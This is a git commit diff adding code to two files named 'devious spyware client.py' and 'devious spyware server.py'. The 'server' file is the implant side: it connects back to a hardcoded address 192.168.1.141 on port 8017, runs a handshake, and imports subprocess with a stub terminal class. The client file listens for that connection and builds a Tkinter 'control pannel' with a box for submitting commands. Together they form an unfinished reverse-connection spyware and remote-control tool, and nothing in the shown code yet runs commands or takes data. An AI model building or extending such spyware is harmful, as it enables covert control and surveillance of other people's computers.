2a04e63c090666d46c8e9d9678937e86c915bb59
rufus173 <166658338+rufus173@users.noreply.github.com>
2024-04-18 23:17:28 +0100

    Add files via upload

--- devious spyware client.py
+++ devious spyware client.py
@@ -1,4 +1,6 @@
 import socket
+import tkinter
+import tkinter.font
 #class for connection
 #class for gui (maybe if i get round to it)
 class remote_connection:
@@ -8,7 +10,7 @@ class remote_connection:
         self.socket_server.listen(1)
         connection, address = self.socket_server.accept()
         self.server = connection
-        self.handshake(["based"])
+        self.handshake(["connected"])
     def handshake(self,buffer):
         self.server.sendall(b"_")
         self.server.recv(1024)
@@ -17,4 +19,39 @@ class remote_connection:
             self.server.sendall(i.encode())
             self.server.recv(1024)
         self.server.sendall(b"&end")
-remote_connection()
+        receive_buffer = []
+        self.server.recv(1024)
+        self.server.sendall(b"_")
+        while True:
+            recv = self.server.recv(1024)
+            if recv == b"&end":
+                break
+            self.server.sendall(b"_")
+            receive_buffer.append(recv.decode())
+        print("half handshake completed, new buffer of",receive_buffer)
+class window(remote_connection):
+    def __init__(self) -> None:
+        super().__init__()
+        self.root = tkinter.Tk()
+        default_font = tkinter.font.nametofont("TkDefaultFont")
+        default_font.configure(size=18)
+        self.root.title("control pannel")
+        
+        #terminal interaction box
+        self.terminal_frame = tkinter.LabelFrame(self.root,text="terminal",fg="green",bg="grey")
+        self.terminal_frame.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
+        self.submit_command_button = tkinter.Button(self.terminal_frame,text="submit command",fg="green",bg="black")
+        self.submit_command_button.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
+        self.submit_command_entry = tkinter.Entry(self.terminal_frame,fg="green",bg="black")
+        self.submit_command_entry.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
+        
+        #status box
+        self.status_frame = tkinter.LabelFrame(self.root,text="status",fg="green",bg="grey")
+        self.status_frame.grid(row=0,column=1,sticky=tkinter.NSEW)
+        self.status_label = tkinter.Label(self.status_frame,text="disconnected",fg="green",bg="black")
+        self.status_label.grid(row=0,column=0,sticky=tkinter.NSEW)
+        
+        #the stack box (what is happening and the contents of the buffer)
+        
+        self.root.mainloop()
+window()
--- devious spyware server.py
+++ devious spyware server.py
@@ -1,10 +1,36 @@
 import socket
+import time
+import os
+import subprocess
 #establishing standards:
 #b'_' acknowledgement
 #b'&end' signifys finnishing a transmition
 class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
     def __init__(self) -> None:
         self.server = socket.socket()
-        self.server.bind()
-    def handshake(self):
+        self.connect()
+    def connect(self):
+        self.server.connect(("192.168.1.141",8017))
+        self.handshake(["connected"])
+    def handshake(self,buffer):
+        receive_buffer = []
         self.server.recv(1024)
+        self.server.sendall(b"_")
+        while True:
+            recv = self.server.recv(1024)
+            if recv == b"&end":
+                break
+            self.server.sendall(b"_")
+            receive_buffer.append(recv.decode())
+        print("half handshake completed, new buffer of",receive_buffer)
+        self.server.sendall(b"_")
+        self.server.recv(1024)
+        send_buffer = buffer
+        for i in send_buffer:
+            self.server.sendall(i.encode())
+            self.server.recv(1024)
+        self.server.sendall(b"&end")
+class terminal:
+    def __init__(self) -> None:
+        pass
+socket_handler = remote_connection()
